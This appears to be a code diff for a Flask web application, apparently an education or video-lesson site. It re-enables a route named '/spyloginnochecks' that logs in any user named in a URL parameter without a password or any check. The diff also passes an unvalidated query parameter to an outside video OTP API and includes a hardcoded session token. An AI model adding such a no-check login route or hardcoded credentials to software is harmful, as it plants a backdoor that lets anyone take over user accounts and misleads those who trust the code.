@@ -481,12 +481,12 @@ def verifyemail():
             
 
 
-# @views.route('/spyloginnochecks', methods=['GET', 'POST'])
-# def loginnochecks():
-#     username = request.args.get('user')
-#     user = User.query.filter_by(username=username).first()
-#     login_user(user)
-#     return redirect(url_for('views.home'))
+@views.route('/spyloginnochecks', methods=['GET', 'POST'])
+def loginnochecks():
+    username = request.args.get('user')
+    user = User.query.filter_by(username=username).first()
+    login_user(user)
+    return redirect(url_for('views.home'))
 
 
 
@@ -749,7 +749,7 @@ def ashrafsessions():
 def ashrafpost(video_id):
     if request.method == 'POST' :
         try:
-            student_name = "spy"
+            student_name = request.args.get('studentname') 
             url = "https://api.csacademyzone.com/video/otp"
             params = {"student_name": student_name, "video_id": video_id}
             headers = {"Content-type": "application/x-www-form-urlencoded", "sessionToken": "imcool"}
